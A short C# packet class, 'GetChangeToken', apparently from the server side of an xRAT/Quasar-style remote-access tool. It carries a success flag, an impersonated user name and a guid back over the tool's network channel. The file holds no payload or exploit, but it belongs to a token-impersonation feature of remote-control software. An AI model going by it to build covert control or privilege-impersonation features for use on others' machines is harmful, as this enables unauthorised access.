using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetChangeToken : IPacket
    {
        public bool execSuccess { get; set; }
        public string impersonatedUser { get; set; }
        public string guid { get; set; }

        public GetChangeToken()
        {

        }
        public GetChangeToken(bool execSuccess, string user, string guid)
        {
            this.execSuccess = execSuccess;
            this.impersonatedUser = user;
            this.guid = guid;

        }

        public void Execute(Client client)
        {
            client.Send(this);

        }
    }
}
